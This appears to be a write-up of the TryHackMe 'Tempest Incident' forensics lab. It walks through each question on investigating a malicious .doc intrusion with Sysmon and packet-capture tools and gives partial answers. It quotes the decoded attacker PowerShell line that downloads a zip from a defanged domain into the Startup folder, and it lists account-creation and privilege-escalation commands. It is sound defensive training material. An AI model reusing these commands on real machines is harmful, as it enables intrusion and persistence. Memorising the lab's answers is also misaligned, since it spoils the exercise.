# Tempest Incident

    In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.

    As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

    The malicious document has a .doc extension.
    The user downloaded the malicious document via chrome.exe.
    The malicious document then executed a chain of commands to attain code execution.
    Investigation Guide

    To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

    Start with the events generated by Sysmon.
    EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
    Follow the child processes of WinWord.exe.
    Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
    We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.
    Significant Data Sources:
    Sysmon

1. The user of this machine was compromised by a malicious document. What is the file name of the document?
--we can find this on Timeline Explorer using sysmon.xml file that extracted before, search chrome.exe or doc files

2. What is the name of the compromised user and machine?
--found on Timeline Explorer

3. What is the PID of the Microsoft Word process that opened the malicious document?
--found on Timline Explorer

4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
--go to sysmon view and search the winword.exe, open the process tree and find the malicious domain

5. What is the base64 encoded string in the malicious payload executed by the document?
--use timeline explorer use keyword base 64 with event id 1

6. What is the CVE number of the exploit used by the attacker to achieve a remote code execution? 
--browse to find the msdt.exe vulnerability 


## Inital Access Stage 2
    Malicious Document - Stage 2

    Based on the initial findings, we discovered that there is a stage 2 execution:

    The document has successfully executed an encoded base64 command.
    Decoding this string reveals the exact command chain executed by the malicious document.
    Investigation Guide

    With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

    The Autostart execution reflects explorer.exe as its parent process ID.
    Child processes of explorer.exe within the event timeframe could be significant.
    Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
    Significant Data Sources:

    Sysmon


1. The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
--found on decoded base64 payload and you will see this
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr hxxp[://]phishteam[.]xyz/02dcf07/update[.]zip -outfile update[.]zip; Expand-Archive .\update[.]zip -DestinationPath .; rm update[.]zip;

--then, search on timeline explorer 'update.zip', payload section.

C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

2. The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user? Format: Remove the double quotes from the log.
--filter event id 1, pay attention to executable info. look at the value that contain the malicious domain.
-- it using powershell command so filter with 'powershell'
-- the parent command line is what will help us to identify which one is the process that start when the system startup.
-- find the parent process explorer.exe




3. Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
--use timeline explorer, search for first.exe as the 2nd file downloaded. look at the payload data and executable info of first.exe
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

4. The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? Format: domain:port
--use sysmon view and look at the process tree of first.exe


## Initial Access - Malicious Document Traffic
    Malicious Document Traffic

    Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

    We discovered the Domain and IP invoked by the malicious document on Sysmon logs.
    There is another domain and IP used by the stage 2 payload logged from the same data source.
    Investigation Guide

    Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:

    We can now use Brim and Wireshark to investigate the packet capture.
    Find network events related to the harvested domains and IP addresses.
    Sample Brim filter that you can use for this investigation: _path=="http" "<malicious domain>"
    Data Sources:

    Packet Capture

1. What is the URL of the malicious payload embedded in the document?
-- use brim and capture.pcapng to examine the traffic made
-- _path=="http" "<malicious domain>"
-- _path=="http" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c



2. What is the encoding used by the attacker on the c2 connection?
--check the uri value



3. The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
--the paramater found on uri also before the coded base64

4. The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
--before the parameter
/9ab62b5

5. What is the HTTP method used by the binary?
GET

6. Based on the user agent, what programming language was used by the attacker to compile the binary? 
--find the user agent using wireshark, choose one of the GET method packets and look at the HTTP protocol panel
NIM


## Discovery - Internal Reconnaissance
    Internal Reconnaissance

    Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:

    We can easily decode the encoded string in the network traffic.
    The traffic contains the command and output executed by the attacker.
    Investigation Guide

    To continue with the investigation, we may focus on the following information:

    Find network and process events connecting to the malicious domain.
    Find network events that contain an encoded command.
    We can use Brim to filter all packets containing the encoded string.
    Look for endpoint enumeration commands since the attacker is already inside the machine.
    In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:

    To get all HTTP requests related to the malicious C2 traffic: 
    
    _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
    
    Significant Data Sources:

    Packet Capture
    Sysmon

1. The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
--using brim look at the uri command value that encoded with base64

2. The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
--check the uri again, decode and find the listening port for wrm (windows remote machine) 

3. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
--back to the Timeline explorer and search for sock


4. What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
--found on the payload value 

5. What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
--use the hash to browse on virustotal

6. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
--examine the executable info on timeline explorer
--you will find wsmprovhost
--browse it and its part of the winrm

## Privilege Escalation - Exploiting Privileges
    Privilege Escalation

    Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.

    Investigation Guide

    With this, we can focus on the following network and endpoint events:

    Look for events executed after the successful execution of the reverse socks proxy tool.
    Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.
    Significant Data Sources:

    Packet Capture
    Sysmon

1. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
--examine the executable info on timeline explorer, process after wsmprovhost
--spf.exe


2. Based on the SHA256 hash of the binary, what is the name of the tool used?
--use the hash of spf.exe on virustotal

3. The tool exploits a specific privilege owned by the user. What is the name of the privilege?
--browse how printspoofer works, clue: github


4. Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
--examine the executable info, downloaded after the spf.exe file

5. The binary connects to a different port from the first c2 connection. What is the port used?
--look at the sysmon view of the downloaded file



## Actions on Objective - Fully-owned Machine
    Fully-Owned Machine

    Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.

    In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.

    Investigation Guide

    Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

    Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
    The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.
    All child events of the new malicious binary used for C2 are worth checking.
    Significant Data Sources:

    Packet Capture
    Sysmon
    Windows Event Logs

1. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
--examine the executable info on timeline explorer


2. Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
/add


3. Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
4720


4. The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
net localgroup administrators /add shion

5. Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
4732


6. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
--examine the executable info after final.exe


### Visit the full challenge lab here : https://tryhackme.com/room/tempestincident


